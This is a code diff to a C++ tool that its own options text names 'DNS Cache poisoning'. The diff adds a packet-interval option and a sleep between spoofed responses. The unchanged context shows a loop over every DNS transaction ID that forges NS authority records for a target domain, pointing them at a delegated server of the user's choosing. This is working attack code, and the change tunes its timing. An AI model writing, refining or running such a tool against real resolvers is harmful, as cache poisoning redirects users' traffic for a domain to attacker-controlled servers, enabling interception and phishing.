@@ -5,6 +5,7 @@
 #include <cstring>
 #include <sstream>
 #include <boost/program_options.hpp>
+#include <unistd.h>
 
 int main( int argc, char **argv )
 {
@@ -15,6 +16,7 @@ int main( int argc, char **argv )
     std::string     target_domainname;
     std::string     delegated_dns_server_name;
     std::string     delegated_dns_server_address;
+    boost::uint32_t interval_mili_second;
 
     po::options_description desc("DNS Cache poisoning");
     desc.add_options()
@@ -36,6 +38,10 @@ int main( int argc, char **argv )
         ("domain,n",
          po::value<std::string>(&target_domainname),
          "Target domainname")
+
+        ("interval,i",
+         po::value<boost::uint32_t>(&interval_mili_second)->default_value(10),
+         "spoofing DNS response packet interval(milisecond)")
 
         ("delegate_name,d",
          po::value<std::string>(&delegated_dns_server_name),
@@ -93,7 +99,7 @@ int main( int argc, char **argv )
 
         udpv4::PacketInfo received_packet;
         for ( int id = 0 ; id < 0xffff ; id++ ) {
-
+	    
             dns::ResponseSection authority;
             authority.r_domainname    = target_domainname;
             authority.r_type          = dns::TYPE_NS;
@@ -134,6 +140,8 @@ int main( int argc, char **argv )
             received_packet = udp.receivePacket( true );
             if ( received_packet.getPayloadLength() > 0 )
                 break;
+
+	    usleep( 1000 * interval_mili_second );
         }
 
         if ( received_packet.getPayloadLength() == 0 )
